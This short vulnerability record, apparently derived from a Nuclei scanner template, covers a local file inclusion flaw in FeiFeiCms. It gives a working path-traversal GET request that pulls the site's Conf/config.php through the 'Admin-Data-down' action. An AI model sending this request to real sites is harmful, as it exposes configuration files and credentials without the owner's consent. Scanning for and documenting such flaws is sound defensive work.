# Vulnerability: FeiFeiCms - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`feifeicms-lfr.yaml`)

## Description
FeiFeiCms is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php
```

